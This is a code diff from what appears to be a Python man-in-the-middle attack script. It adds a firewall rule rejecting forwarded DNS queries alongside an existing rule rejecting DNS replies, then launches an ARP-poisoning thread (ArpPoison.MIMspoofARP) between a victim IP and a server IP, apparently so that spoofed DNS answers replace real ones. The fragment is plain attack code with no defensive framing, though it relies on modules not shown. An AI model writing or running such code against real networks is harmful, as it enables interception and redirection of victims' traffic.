@@ -59,6 +59,8 @@ def main() :
     stop_dns = Rule(proto='udp', sport='53')
     tables = default_tables()
     tables['filter']['FORWARD'].append(stop_dns(jump='REJECT'))
+    stop_first = Rule(proto='udp', dport='53')
+    tables['filter']['FORWARD'].append(stop_first(jump='REJECT'))
     arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(ipVictim, ipServer), daemon=True)
     arpThread.start()
     while True: 
